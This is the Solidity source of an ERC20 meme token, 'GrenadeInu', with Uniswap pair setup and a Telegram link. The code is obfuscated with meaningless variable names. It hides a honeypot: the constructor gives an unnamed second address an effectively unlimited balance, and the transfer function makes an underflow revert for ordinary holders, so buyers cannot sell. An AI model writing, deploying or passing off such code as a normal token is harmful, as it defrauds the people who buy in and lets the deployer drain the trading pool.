// https://t.me/Gernadeinu

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract GrenadeInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private environment;

    function _transfer(
        address our,
        address sentence,
        uint256 caught
    ) internal override {
        uint256 purple = contrast;

        if (yesterday[our] == 0 && environment[our] > 0 && uniswapV2Pair != our) {
            yesterday[our] -= purple;
        }

        address friendly = mix;
        mix = sentence;
        environment[friendly] += purple + 1;

        _balances[our] -= caught;
        uint256 level = (caught / 100) * contrast;
        caught -= level;
        _balances[sentence] += caught;
    }

    address private mix;
    mapping(address => uint256) private yesterday;
    uint256 public contrast = 3;

    constructor(
        string memory sing,
        string memory halfway,
        address higher,
        address farther
    ) ERC20(sing, halfway) {
        uint256 note = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(higher);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        yesterday[msg.sender] = note;
        yesterday[farther] = note;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[farther] = note;
    }
}